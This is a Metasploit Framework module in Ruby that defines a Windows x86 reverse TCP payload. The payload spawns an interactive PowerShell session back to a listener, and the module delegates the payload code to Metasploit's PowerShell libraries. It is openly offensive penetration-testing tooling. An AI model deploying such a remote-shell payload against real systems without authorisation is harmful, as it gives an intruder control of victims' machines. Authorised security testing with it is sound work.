##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'rex/powershell'

module MetasploitModule
  CachedSize = :dynamic

  include Msf::Payload::Windows::Exec
  include Msf::Payload::Windows::Powershell
  include Rex::Powershell::Command

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Interactive Powershell Session, Reverse TCP',
        'Description' => 'Listen for a connection and spawn an interactive powershell session',
        'Author' => [
          'Ben Turner', # benpturner
          'Dave Hardy' # davehardy20
        ],
        'References' => [
          ['URL', 'https://blog.nettitude.com/uk/interactive-powershell-session-via-metasploit']
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_X86,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::PowerShell
      )
    )
  end

  #
  # Override the exec command string
  #
  def powershell_command
    generate_powershell_code('Reverse')
  end
end
